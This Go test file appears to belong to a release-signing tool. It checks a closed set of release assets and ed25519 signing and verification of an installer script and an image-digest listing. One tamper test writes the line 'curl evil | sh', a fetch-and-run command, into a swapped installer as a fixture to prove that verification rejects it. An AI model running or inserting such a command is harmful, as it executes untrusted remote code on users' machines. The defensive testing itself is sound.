package main

import (
	"crypto/ed25519"
	"crypto/sha256"
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestReleaseAssetsAreAClosedSet(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	for _, name := range expectedReleaseAssets() {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(name), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	if err := validateReleaseAssets(dir); err != nil {
		t.Fatal(err)
	}
	first := expectedReleaseAssets()[0]
	if err := os.Rename(filepath.Join(dir, first), filepath.Join(dir, first+"-substitute")); err != nil {
		t.Fatal(err)
	}
	if err := validateReleaseAssets(dir); err == nil {
		t.Fatal("same-count asset substitution passed")
	}
}

func writeDist(t *testing.T, dir string) {
	t.Helper()
	var manifest strings.Builder
	for _, name := range expectedReleaseAssets() {
		body := []byte(name)
		if err := os.WriteFile(filepath.Join(dir, name), body, 0o600); err != nil {
			t.Fatal(err)
		}
		fmt.Fprintf(&manifest, "%x  %s\n", sha256.Sum256(body), name)
	}
	if err := os.WriteFile(filepath.Join(dir, "SHA256SUMS"), []byte(manifest.String()), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, installerAsset), []byte("#!/usr/bin/env sh\n"), 0o600); err != nil {
		t.Fatal(err)
	}
}

// The site publishes the installer from the release, so an unsigned or altered
// script has to fail the release rather than reach an adopter.
func TestProcessRequiresASignedInstaller(t *testing.T) {
	t.Parallel()
	publicKey, privateKey, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("installer is signed and verified", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeDist(t, dir)
		if err := process(dir, privateKey, publicKey, false); err != nil {
			t.Fatalf("sign: %v", err)
		}
		if _, err := os.Stat(filepath.Join(dir, installerAsset+".sig")); err != nil {
			t.Fatalf("installer was not signed: %v", err)
		}
		if err := process(dir, privateKey, publicKey, true); err != nil {
			t.Fatalf("verify: %v", err)
		}
		if err := os.WriteFile(filepath.Join(dir, installerAsset), []byte("#!/usr/bin/env sh\ncurl evil | sh\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := process(dir, privateKey, publicKey, true); err == nil {
			t.Fatal("a swapped installer verified")
		}
	})

	t.Run("missing installer fails the release", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeDist(t, dir)
		if err := os.Remove(filepath.Join(dir, installerAsset)); err != nil {
			t.Fatal(err)
		}
		err := process(dir, privateKey, publicKey, false)
		if err == nil || !strings.Contains(err.Error(), installerAsset) {
			t.Fatalf("missing installer error = %v", err)
		}
	})
}

func TestProcessSignsImageDigestsWhenPresent(t *testing.T) {
	t.Parallel()
	publicKey, privateKey, err := ed25519.GenerateKey(nil)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("absent listing still signs and verifies", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeDist(t, dir)
		if err := process(dir, privateKey, publicKey, false); err != nil {
			t.Fatalf("sign: %v", err)
		}
		if _, err := os.Stat(filepath.Join(dir, imageDigestsAsset+".sig")); !errors.Is(err, fs.ErrNotExist) {
			t.Fatalf("absent listing produced a signature: %v", err)
		}
		if err := process(dir, privateKey, publicKey, true); err != nil {
			t.Fatalf("verify: %v", err)
		}
	})

	t.Run("present listing is signed and verified", func(t *testing.T) {
		t.Parallel()
		dir := t.TempDir()
		writeDist(t, dir)
		listing := filepath.Join(dir, imageDigestsAsset)
		if err := os.WriteFile(listing, []byte(`{"tag":"v1.2.3","images":[]}`), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := process(dir, privateKey, publicKey, false); err != nil {
			t.Fatalf("sign: %v", err)
		}
		if _, err := os.Stat(listing + ".sig"); err != nil {
			t.Fatalf("listing was not signed: %v", err)
		}
		if err := process(dir, privateKey, publicKey, true); err != nil {
			t.Fatalf("verify: %v", err)
		}
		if err := os.WriteFile(listing, []byte(`{"tag":"v1.2.3","images":["swapped"]}`), 0o600); err != nil {
			t.Fatal(err)
		}
		if err := process(dir, privateKey, publicKey, true); err == nil {
			t.Fatal("a swapped image listing verified")
		}
	})
}
